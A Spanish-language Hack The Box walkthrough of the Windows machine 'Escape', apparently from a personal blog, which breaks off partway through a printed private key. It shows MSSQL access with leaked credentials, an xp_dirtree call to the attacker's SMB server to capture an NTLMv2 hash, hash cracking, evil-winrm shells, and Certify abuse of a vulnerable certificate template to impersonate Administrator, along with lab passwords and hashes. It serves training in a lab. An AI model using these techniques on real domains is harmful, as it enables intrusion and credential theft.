---
layout: single
title: Escape - Hack The Box
excerpt: "En este post vamos a estar resolviendo la maquina Escape de la plataforma de HackTheBox donde gracias a un archivo que encontramos por SMB podremos obtener credenciales e información sobre la base de datos para conectarnos con mssqlclient para así aprovecharnos de que podemos ejecutar un comando para obtener el Hash NTLMv2 de un usuario y conectarnos con evil-wirnm para la escalada de privilegios nos convertiremos en otro usuario para de hay aprovecharnos un template vulnerable y obtener el Hash del usuario Administrador"
date: 2023-06-17
classes: wide
toc: true
toc_label: "Contenido"
toc_icon: "fire"
header:
  teaser: /assets/images/htb-writeup-escape/icon.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - hackthebox
  - infosec
tags:  
  - MSSQL
  - Active Directory
  - Cracking Hashes
  - Misconfigured Certificate Template
  - Hash NTLM
---

⮕ Maquina Windows

![](/assets/images/htb-writeup-escape/inicio.png)

```bash
❯ ping -c 1 10.10.11.202
PING 10.10.11.202 (10.10.11.202) 56(84) bytes of data.
64 bytes from 10.10.11.202: icmp_seq=1 ttl=127 time=113 ms

--- 10.10.11.202 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 112.763/112.763/112.763/0.000 ms
❯ whichSystem.py 10.10.11.202

10.10.11.202 (ttl -> 127): Windows
```

## PortScan 

```bash
❯ nmap -sCV -p53,88,135,139,389,445,464,593,636,1433,3268,3269,5985,9389,49667,49681,55669 10.10.11.202 -oN targeted
Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-16 12:18 CST
Nmap scan report for 10.10.11.202
Host is up (0.12s latency).

PORT      STATE    SERVICE       VERSION
53/tcp    open     domain        Simple DNS Plus
88/tcp    open     kerberos-sec  Microsoft Windows Kerberos (server time: 2023-06-17 02:18:11Z)
135/tcp   open     msrpc         Microsoft Windows RPC
139/tcp   open     netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open     ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2023-06-17T02:19:43+00:00; +7h59m59s from scanner time.
| ssl-cert: Subject: commonName=dc.sequel.htb
| Subject Alternative Name: othername:<unsupported>, DNS:dc.sequel.htb
| Not valid before: 2022-11-18T21:20:35
|_Not valid after:  2023-11-18T21:20:35
445/tcp   open     microsoft-ds?
464/tcp   open     kpasswd5?
593/tcp   open     ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open     ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2023-06-17T02:19:42+00:00; +7h59m59s from scanner time.
| ssl-cert: Subject: commonName=dc.sequel.htb
| Subject Alternative Name: othername:<unsupported>, DNS:dc.sequel.htb
| Not valid before: 2022-11-18T21:20:35
|_Not valid after:  2023-11-18T21:20:35
1433/tcp  open     ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
|_ms-sql-ntlm-info: ERROR: Script execution failed (use -d to debug)
|_ms-sql-info: ERROR: Script execution failed (use -d to debug)
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2023-06-17T02:08:27
|_Not valid after:  2053-06-17T02:08:27
|_ssl-date: 2023-06-17T02:19:43+00:00; +7h59m59s from scanner time.
3268/tcp  open     ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2023-06-17T02:19:43+00:00; +7h59m59s from scanner time.
| ssl-cert: Subject: commonName=dc.sequel.htb
| Subject Alternative Name: othername:<unsupported>, DNS:dc.sequel.htb
| Not valid before: 2022-11-18T21:20:35
|_Not valid after:  2023-11-18T21:20:35
3269/tcp  open     ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.sequel.htb
| Subject Alternative Name: othername:<unsupported>, DNS:dc.sequel.htb
| Not valid before: 2022-11-18T21:20:35
|_Not valid after:  2023-11-18T21:20:35
|_ssl-date: 2023-06-17T02:19:42+00:00; +7h59m58s from scanner time.
5985/tcp  open     http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open     mc-nmf        .NET Message Framing
49667/tcp open     msrpc         Microsoft Windows RPC
49681/tcp filtered unknown
55669/tcp filtered unknown
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2023-06-17T02:19:01
|_  start_date: N/A
|_clock-skew: mean: 7h59m58s, deviation: 0s, median: 7h59m58s
| smb2-security-mode: 
|   311: 
|_    Message signing enabled and required

```

## Enumeracion 

El escaneo de **Nmap** ya nos esta reportando 2 subdominos así que vamos a agregarlos al **/etc/hosts**

```bash
❯ echo "10.10.11.202 dc.sequel.htb sequel.htb" | sudo tee -a /etc/hosts
10.10.11.202 dc.sequel.htb sequel.htb
❯ ping -c 1 dc.sequel.htb
PING dc.sequel.htb (10.10.11.202) 56(84) bytes of data.
64 bytes from dc.sequel.htb (10.10.11.202): icmp_seq=1 ttl=127 time=113 ms

--- dc.sequel.htb ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 112.664/112.664/112.664/0.000 ms
❯ ping -c 1 sequel.htb
PING dc.sequel.htb (10.10.11.202) 56(84) bytes of data.
64 bytes from dc.sequel.htb (10.10.11.202): icmp_seq=1 ttl=127 time=114 ms

--- dc.sequel.htb ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 113.908/113.908/113.908/0.000 ms
```

Ahora vamos a ver ante que estamos con la herramienta de **crakmapexec**

```bash
❯ crackmapexec smb 10.10.11.202
SMB         10.10.11.202    445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:sequel.htb) (signing:True) (SMBv1:False)
```

Ahora mediante **smbclient** vamos a listar recursos compartidos por **SMB** empleando un **Null Session** por que no tenemos credenciales de ningún usuario aun

```bash
❯ smbclient -L 10.10.11.202 -N

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	NETLOGON        Disk      Logon server share 
	Public          Disk      
	SYSVOL          Disk      Logon server share 
SMB1 disabled -- no workgroup available
```

Vemos que hay un recurso que se llama **Public** así que vamos a ver si podemos acceder a el para ver que encontramos 

```bash
❯ smbclient //10.10.11.202/Public -N
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Sat Nov 19 05:51:25 2022
  ..                                  D        0  Sat Nov 19 05:51:25 2022
  SQL Server Procedures.pdf           A    49551  Fri Nov 18 07:39:43 2022

		5184255 blocks of size 4096. 1474795 blocks available
smb: \> 

```

Vamos a descargarnos el archivo **.pdf** para ver cual es su contenido 

```bash
smb: \> get "SQL Server Procedures.pdf"
getting file \SQL Server Procedures.pdf of size 49551 as SQL Server Procedures.pdf (70.0 KiloBytes/sec) (average 70.0 KiloBytes/sec)
smb: \> 
```

Vamos a proceder a abrirlo

```bash
❯ open SQL\ Server\ Procedures.pdf &>/dev/null & disown
[1] 37141
```

Este es el contenido de la primera hoja

![](/assets/images/htb-writeup-escape/web1.png)

Vamos que nos están diciendo que tuvieron un incidente con sus **SQL Servers** ademas nos están dando 2 usuarios **Ryan y Brandon**

Este es el contenido de la segunda hoja y ya nos están dando una contraseña 

![](/assets/images/htb-writeup-escape/web2.png)

Vamos acceder ala base de datos empleando las credenciales que nos compartieron en el archivo **PDF** `PublicUser:GuestUserCantWrite1`

Para eso vamos a usar la herramienta de `impacket` que es `mssqlclient`

```bash
❯ impacket-mssqlclient WORKGROUP/PublicUser:GuestUserCantWrite1@10.10.11.202
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC\SQLMOCK): Line 1: Changed database context to 'master'.
[*] INFO(DC\SQLMOCK): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) 
[!] Press help for extra shell commands
SQL> 
```

Buscando información podemos ejecutar los siguientes comandos con el servicio  

```bash
SQL> help

     lcd {path}                 - changes the current local directory to {path}
     exit                       - terminates the server process (and this session)
     enable_xp_cmdshell         - you know what it means
     disable_xp_cmdshell        - you know what it means
     xp_cmdshell {cmd}          - executes cmd using xp_cmdshell
     sp_start_job {cmd}         - executes cmd using the sql server agent (blind)
     ! {cmd}                    - executes a local shell cmd
     
SQL> 
```

# Get Hash NTLMv2

Si buscamos en internet como podemos aprovecharnos de esto nos hablan sobre **Microsoft SQL Server’s** <https://www.acunetix.com/blog/articles/sqli-part-6-out-of-band-sqli/>

![](/assets/images/htb-writeup-escape/web3.png)

Lo que podemos hacer es usar `smbserver.py` para montar un recurso compartido a nivel de red y mediante la shell que tenemos con **SQL** hacer una petición a nuestro servidor para que cuando se autentique ver si nos llega algún **hash** **NTLMv2**

```bash
❯ smbserver.py parrotsec . -smb2support
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```

Ahora hacemos la petición al nombre del recurso que se llama **parrotsec** 

```bash
SQL> xp_dirtree '\\10.10.14.12\parrotsec'
subdirectory                                                                                                                                                                                                                                                            depth   

---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------   -----------   

SQL> 
```

Y nos llega el **Hash** del usuario `sql_svc`

```bash
❯ smbserver.py parrotsec . -smb2support
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
[*] Incoming connection (10.10.11.202,51953)
[*] AUTHENTICATE_MESSAGE (sequel\sql_svc,DC)
[*] User DC\sql_svc authenticated successfully
[*] sql_svc::sequel:aaaaaaaaaaaaaaaa:fdf163a231e81c71f28d4042c0abb102:0101000000000000807c9e0098a0d90109e0928876f6cc7a00000000010010004c0057005a0042006600510071005500030010004c0057005a00420066005100710055000200100068006b00520064004d00630064006a000400100068006b00520064004d00630064006a0007000800807c9e0098a0d90106000400020000000800300030000000000000000000000000300000de8f02f9822bda24a4798b75e04084b7ed4eee42dd1ae2ef007a6b34d97f78090a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e00310032000000000000000000
[*] Closing down connection (10.10.11.202,51953)
[*] Remaining connections []

```

Ahora vamos a crekearlo con **john**

```bash
❯ catn hash
sql_svc::sequel:aaaaaaaaaaaaaaaa:fdf163a231e81c71f28d4042c0abb102:0101000000000000807c9e0098a0d90109e0928876f6cc7a00000000010010004c0057005a0042006600510071005500030010004c0057005a00420066005100710055000200100068006b00520064004d00630064006a000400100068006b00520064004d00630064006a0007000800807c9e0098a0d90106000400020000000800300030000000000000000000000000300000de8f02f9822bda24a4798b75e04084b7ed4eee42dd1ae2ef007a6b34d97f78090a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e00310032000000000000000000
```

Vemos la contraseña 

```bash
❯ john -w:/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
REGGIE1234ronnie (sql_svc)
1g 0:00:00:14 DONE (2023-06-16 15:20) 0.06811g/s 728937p/s 728937c/s 728937C/s REINLY..REDMAN69
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed
```

**sql_svc:REGGIE1234ronnie**

Si verificamos las credenciales para ver si podemos conectarnos con `evil-winrm` vemos que las credenciales son correctas

```bash
❯ crackmapexec winrm 10.10.11.202 -u 'sql_svc' -p 'REGGIE1234ronnie'
SMB         10.10.11.202    5985   DC               [*] Windows 10.0 Build 17763 (name:DC) (domain:sequel.htb)
HTTP        10.10.11.202    5985   DC               [*] http://10.10.11.202:5985/wsman
WINRM       10.10.11.202    5985   DC               [+] sequel.htb\sql_svc:REGGIE1234ronnie (Pwn3d!)
```

Antes de conectarnos ala maquina victima lo que podemos hacer es conectarnos con `rpcclient` para enumerar mas usuarios del dominio por podemos ver si reutilizan la contraseña que tenemos

```bash
❯ rpcclient 10.10.11.202 -U 'sql_svc%REGGIE1234ronnie' -c enumdomusers
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[Tom.Henn] rid:[0x44f]
user:[Brandon.Brown] rid:[0x450]
user:[Ryan.Cooper] rid:[0x451]
user:[sql_svc] rid:[0x452]
user:[James.Roberts] rid:[0x453]
user:[Nicole.Thompson] rid:[0x454]
```

También podemos hacerlo de esta manera

```bash
❯ crackmapexec smb 10.10.11.202 -u 'sql_svc' -p 'REGGIE1234ronnie' --users | awk '{print $5}' | grep sequel
sequel.htb\Nicole.Thompson
sequel.htb\James.Roberts
sequel.htb\sql_svc
sequel.htb\Ryan.Cooper
sequel.htb\Brandon.Brown
sequel.htb\Tom.Henn
sequel.htb\krbtgt
sequel.htb\Guest
sequel.htb\Administrator
```

Ahora vamos a meterlos a una lista 

```bash
❯ cat users
───────┬────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: users
───────┼────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ N.Thompson
   2   │ J.Roberts
   3   │ sql_svc
   4   │ R.Cooper
   5   │ B.Brown
   6   │ T.Henn
   7   │ krbtgt
   8   │ Guest
   9   │ Administrator
───────┴────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
```

Si probamos con `kerberos` nos dice esto así que lo bueno vamos a conectarnos con `evil-winrm`

```bash
❯ ./kerbrute userenum users --dc dc.sequel.htb -d sequel.htb

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 06/16/23 - Ronnie Flathers @ropnop

2023/06/16 15:33:02 >  Using KDC(s):
2023/06/16 15:33:02 >  	dc.sequel.htb:88

2023/06/16 15:33:02 >  [+] VALID USERNAME:	sql_svc@sequel.htb
2023/06/16 15:33:02 >  [+] VALID USERNAME:	Guest@sequel.htb
2023/06/16 15:33:02 >  [+] VALID USERNAME:	Administrator@sequel.htb
2023/06/16 15:33:02 >  Done! Tested 9 usernames (3 valid) in 0.150 seconds
❯ GetNPUsers.py sequel.htb/ -no-pass -usersfile users
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] User sql_svc doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] User Guest doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
```

Si hice algo mal contactarme por **Discord** por favor **miguelrega7**

## Shell as sql_svc

Podemos conectarnos y estamos en la maquina victima

```bash
❯ evil-winrm -i 10.10.11.202 -u 'sql_svc' -p 'REGGIE1234ronnie'
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\sql_svc\Documents> whoami
sequel\sql_svc
*Evil-WinRM* PS C:\Users\sql_svc\Documents> ipconfig

Windows IP Configuration


Ethernet adapter Ethernet0 2:

   Connection-specific DNS Suffix  . : htb
   IPv6 Address. . . . . . . . . . . : dead:beef::24c
   IPv6 Address. . . . . . . . . . . : dead:beef::9045:a178:c6da:1141
   Link-local IPv6 Address . . . . . : fe80::9045:a178:c6da:1141%4
   IPv4 Address. . . . . . . . . . . : 10.10.11.202
   Subnet Mask . . . . . . . . . . . : 255.255.254.0
   Default Gateway . . . . . . . . . : fe80::250:56ff:feb9:a809%4
                                       10.10.10.2
*Evil-WinRM* PS C:\Users\sql_svc\Documents> 
```

## Road to Ryan.Cooper

De primeras no vemos nada interesante

```bash
*Evil-WinRM* PS C:\Users\sql_svc\Desktop> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
*Evil-WinRM* PS C:\Users\sql_svc\Desktop> 
```

Hay vemos todos los usuarios

```bash
*Evil-WinRM* PS C:\Users\sql_svc> net user

User accounts for \\

-------------------------------------------------------------------------------
Administrator            Brandon.Brown            Guest
James.Roberts            krbtgt                   Nicole.Thompson
Ryan.Cooper              sql_svc                  Tom.Henn
The command completed with one or more errors.

*Evil-WinRM* PS C:\Users\sql_svc> 
```

Si miramos mas información de nuestro usuario vemos cosas que ya sabemos así que vamos a subir el `Winpeas` para enumerar el sistema

```bash
*Evil-WinRM* PS C:\Users\sql_svc> net user sql_svc
User name                    sql_svc
Full Name
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            11/18/2022 2:13:13 PM
Password expires             Never
Password changeable          11/19/2022 2:13:13 PM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   6/16/2023 9:39:34 PM

Logon hours allowed          All

Local Group Memberships      *Remote Management Use
Global Group memberships     *Domain Users
The command completed successfully.

*Evil-WinRM* PS C:\Users\sql_svc> 
```

<https://github.com/carlospolop/PEASS-ng/releases>

```bash
*Evil-WinRM* PS C:\Users\sql_svc\Documents> upload winPEASx64.exe
                                        
Info: Uploading /home/miguel7/Hackthebox/Escape/content/winPEASx64.exe to C:\Users\sql_svc\Documents\winPEASx64.exe
                                        
Data: 2704724 bytes of 2704724 bytes copied
                                        
Info: Upload successful!
*Evil-WinRM* PS C:\Users\sql_svc\Documents> 
```

Después de correr el `Winpeas` hay un archivo donde hay un **.BAK** y viene credenciales de otro usuario 

```bash
*Evil-WinRM* PS C:\Users\sql_svc\Documents> cd C:\
*Evil-WinRM* PS C:\> cd SQLServer
*Evil-WinRM* PS C:\SQLServer> dir


    Directory: C:\SQLServer


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----         2/7/2023   8:06 AM                Logs
d-----       11/18/2022   1:37 PM                SQLEXPR_2019
-a----       11/18/2022   1:35 PM        6379936 sqlexpress.exe
-a----       11/18/2022   1:36 PM      268090448 SQLEXPR_x64_ENU.exe


*Evil-WinRM* PS C:\SQLServer> cd Logs
*Evil-WinRM* PS C:\SQLServer\Logs> dir


    Directory: C:\SQLServer\Logs


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----         2/7/2023   8:06 AM          27608 ERRORLOG.BAK


*Evil-WinRM* PS C:\SQLServer\Logs> 
```

![](/assets/images/htb-writeup-escape/web4.png)

Si filtramos por la `String` **Password** vemos que nos muestran las credenciales del Usuario `Ryan.Cooper` 

Vamos a verificar que sean correctas para ver si podemos conectarnos con `evil-winrm`

```bash
❯ crackmapexec winrm 10.10.11.202 -u 'Ryan.Cooper' -p 'NuclearMosquito3'
SMB         10.10.11.202    5985   DC               [*] Windows 10.0 Build 17763 (name:DC) (domain:sequel.htb)
HTTP        10.10.11.202    5985   DC               [*] http://10.10.11.202:5985/wsman
WINRM       10.10.11.202    5985   DC               [+] sequel.htb\Ryan.Cooper:NuclearMosquito3 (Pwn3d!)
```

## Shell as Ryan.Cooper

Ahora nos conectamos con `evil-winrm`

```bash
❯ evil-winrm -i 10.10.11.202 -u 'Ryan.Cooper' -p 'NuclearMosquito3'
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Ryan.Cooper\Documents> whoami
sequel\ryan.cooper
*Evil-WinRM* PS C:\Users\Ryan.Cooper\Documents> 
```

## User.txt 

```bash
*Evil-WinRM* PS C:\Users\Ryan.Cooper\Desktop> type user.txt
3012b1a853be34bc305df5dd4477a3ac
*Evil-WinRM* PS C:\Users\Ryan.Cooper\Desktop> 
```

## Escalada de Privilegios 

Después de correr el `winpeas` vemos esto que es interesante 

```bash
*Evil-WinRM* PS C:\Users\Ryan.Cooper\Documents> upload winPEASx64.exe
                                        
Info: Uploading /home/miguel7/Hackthebox/Escape/content/winPEASx64.exe to C:\Users\Ryan.Cooper\Documents\winPEASx64.exe
                                        
Data: 2704724 bytes of 2704724 bytes copied
                                        
Info: Upload successful!
*Evil-WinRM* PS C:\Users\Ryan.Cooper\Documents> 
```

![](/assets/images/htb-writeup-escape/web5.png)

Como nos están hablando sobre certificados y template vamos a subir el siguiete **.exe** a la maquina <https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/blob/master/Certify.exe>

Ahora lo vamos a subir ala maquina victima

```bash
*Evil-WinRM* PS C:\Users\Ryan.Cooper\Documents> upload Certify.exe
                                        
Info: Uploading /home/miguel7/Hackthebox/Escape/content/Certify.exe to C:\Users\Ryan.Cooper\Documents\Certify.exe
                                              
Data: 232104 bytes of 232104 bytes copied
                                        
Info: Upload successful!
*Evil-WinRM* PS C:\Users\Ryan.Cooper\Documents> dir


    Directory: C:\Users\Ryan.Cooper\Documents


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        6/16/2023  11:58 PM         174080 Certify.exe
-a----        6/16/2023  11:08 PM        2028544 winPEASx64.exe


*Evil-WinRM* PS C:\Users\Ryan.Cooper\Documents> 
```

En este articulo nos explican como usar el **script** <https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/from-misconfigured-certificate-template-to-domain-admin>

Ahora corremos el **.exe**

```bash
*Evil-WinRM* PS C:\Users\Ryan.Cooper\Documents> .\Certify.exe find /vulnerable /currentuser

   _____          _   _  __
  / ____|        | | (_)/ _|
 | |     ___ _ __| |_ _| |_ _   _
 | |    / _ \ '__| __| |  _| | | |
 | |___|  __/ |  | |_| | | | |_| |
  \_____\___|_|   \__|_|_|  \__, |
                             __/ |
                            |___./
  v1.0.0

[*] Action: Find certificate templates
[*] Using current user's unrolled group SIDs for vulnerability checks.
[*] Using the search base 'CN=Configuration,DC=sequel,DC=htb'

[*] Listing info about the Enterprise CA 'sequel-DC-CA'

    Enterprise CA Name            : sequel-DC-CA
    DNS Hostname                  : dc.sequel.htb
    FullName                      : dc.sequel.htb\sequel-DC-CA
    Flags                         : SUPPORTS_NT_AUTHENTICATION, CA_SERVERTYPE_ADVANCED
    Cert SubjectName              : CN=sequel-DC-CA, DC=sequel, DC=htb
    Cert Thumbprint               : A263EA89CAFE503BB33513E359747FD262F91A56
    Cert Serial                   : 1EF2FA9A7E6EADAD4F5382F4CE283101
    Cert Start Date               : 11/18/2022 12:58:46 PM
    Cert End Date                 : 11/18/2121 1:08:46 PM
    Cert Chain                    : CN=sequel-DC-CA,DC=sequel,DC=htb
    UserSpecifiedSAN              : Disabled
    CA Permissions                :
      Owner: BUILTIN\Administrators        S-1-5-32-544

      Access Rights                                     Principal

      Allow  Enroll                                     NT AUTHORITY\Authenticated UsersS-1-5-11
      Allow  ManageCA, ManageCertificates               BUILTIN\Administrators        S-1-5-32-544
      Allow  ManageCA, ManageCertificates               sequel\Domain Admins          S-1-5-21-4078382237-1492182817-2568127209-512
      Allow  ManageCA, ManageCertificates               sequel\Enterprise Admins      S-1-5-21-4078382237-1492182817-2568127209-519
    Enrollment Agent Restrictions : None

[!] Vulnerable Certificates Templates :

    CA Name                               : dc.sequel.htb\sequel-DC-CA
    Template Name                         : UserAuthentication
    Schema Version                        : 2
    Validity Period                       : 10 years
    Renewal Period                        : 6 weeks
    msPKI-Certificate-Name-Flag          : ENROLLEE_SUPPLIES_SUBJECT
    mspki-enrollment-flag                 : INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS
    Authorized Signatures Required        : 0
    pkiextendedkeyusage                   : Client Authentication, Encrypting File System, Secure Email
    mspki-certificate-application-policy  : Client Authentication, Encrypting File System, Secure Email
    Permissions
      Enrollment Permissions
        Enrollment Rights           : sequel\Domain Admins          S-1-5-21-4078382237-1492182817-2568127209-512
                                      sequel\Domain Users           S-1-5-21-4078382237-1492182817-2568127209-513
                                      sequel\Enterprise Admins      S-1-5-21-4078382237-1492182817-2568127209-519
      Object Control Permissions
        Owner                       : sequel\Administrator          S-1-5-21-4078382237-1492182817-2568127209-500
        WriteOwner Principals       : sequel\Administrator          S-1-5-21-4078382237-1492182817-2568127209-500
                                      sequel\Domain Admins          S-1-5-21-4078382237-1492182817-2568127209-512
                                      sequel\Enterprise Admins      S-1-5-21-4078382237-1492182817-2568127209-519
        WriteDacl Principals        : sequel\Administrator          S-1-5-21-4078382237-1492182817-2568127209-500
                                      sequel\Domain Admins          S-1-5-21-4078382237-1492182817-2568127209-512
                                      sequel\Enterprise Admins      S-1-5-21-4078382237-1492182817-2568127209-519
        WriteProperty Principals    : sequel\Administrator          S-1-5-21-4078382237-1492182817-2568127209-500
                                      sequel\Domain Admins          S-1-5-21-4078382237-1492182817-2568127209-512
                                      sequel\Enterprise Admins      S-1-5-21-4078382237-1492182817-2568127209-519



Certify completed in 00:00:10.3938804
*Evil-WinRM* PS C:\Users\Ryan.Cooper\Documents> 
```

La herramienta encontró un **Template** vulnerable vamos a seguir instrucciones del link mencionado anteriormente <https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/from-misconfigured-certificate-template-to-domain-admin>

Ahora vamos a obtener la clave privada pasandole el template Vulnerable

```bash
*Evil-WinRM* PS C:\Users\Ryan.Cooper\Documents> .\Certify.exe request /ca:dc.sequel.htb\sequel-DC-CA /template:UserAuthentication /altname:Administrator

   _____          _   _  __
  / ____|        | | (_)/ _|
 | |     ___ _ __| |_ _| |_ _   _
 | |    / _ \ '__| __| |  _| | | |
 | |___|  __/ |  | |_| | | | |_| |
  \_____\___|_|   \__|_|_|  \__, |
                             __/ |
                            |___./
  v1.0.0

[*] Action: Request a Certificates

[*] Current user context    : sequel\Ryan.Cooper
[*] No subject name specified, using current context as subject.

[*] Template                : UserAuthentication
[*] Subject                 : CN=Ryan.Cooper, CN=Users, DC=sequel, DC=htb
[*] AltName                 : Administrator

[*] Certificate Authority   : dc.sequel.htb\sequel-DC-CA

[*] CA Response             : The certificate had been issued.
[*] Request ID              : 10

[*] cert.pem         :

-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEAvYJ0bcEO/Ro+WHZaImNp5S/djZO0czq0JkYwNPtlcQqu20Hx
i/VPRLnOUoOscqkoejuVn+/iV/y/pCx2oMQrmXJbHmeg2hh8nSDIgO9xq9HRFW7W
BFy85BYGl0Yw7+Ff8LbApmBSg8qDjdzsFhA0yTrLagb6uKuxLqKPZBJ6JYemzSfC
qn48LC/wyatA00VAITZA9nAgjGAUxSD9ztzQHR455CWyGwx1xjfWhQmRNH0Uf8Lr
eQc3+qIxQGeXGJk/1tWc4Y+WWiB7JUbC6U7MOXwK+Mp6SDBJ6rfbRvCx0Hxmh+N/
QGMcwTcmEvlOwz+1StURbWckj0lDrI/1z2QJ8QIDAQABAoIBAHBkclC1cwJBEkC8
0HAcra0zWh6hPyAn7LfWYLjLcDo+r71xuqPa9Qw5dlgRp7DJCiyUMgUM7Bxq1e20
QRbPwVvcKpY5t3ghlaZKzx9I4w2X/nzLozorFgvf1EDbbCKYc6H7gP4rmkR3UtZL
8+iR6/x8Vi+nvALSMN8LoicjnjWq3LT+mQLcl65OsT+RdI6hYg6hp54Np1+Nd6Ef
DgJNb0vwadnvWs683nm975ovoTEkQVqFjYJQyOO+Tj4z3fzTBD3imA3U88Wxyebs
dhvgD3T+FD7O72UFIR+TF93IB97WcZCYthPgwGF7kgwWUObLhcwwg5p+CkkkGlA7
KlWUu9ECgYEA1q+9t93Z1S7T6k93NCRP6zZVnV9J+XAi4JuaPpPaBjHONlPZN/Fa
yXqF9QonWZu6VPdEhD6hh8etQOFKCy4NgUNY6AVbCAQ7F4BrbsIXdBc9GeGwP1/I
55suWcnzhn33dMvBmETGuTCy7kXZqOO7Te2jkR8XjuRCmJ/v6CAzpxcCgYEA4fpn
0OHW/tOWCovIy72y9nEwbMsllxIyJN1etRrYuw0dp92WttKtPS3ectqnp7EsbiIl
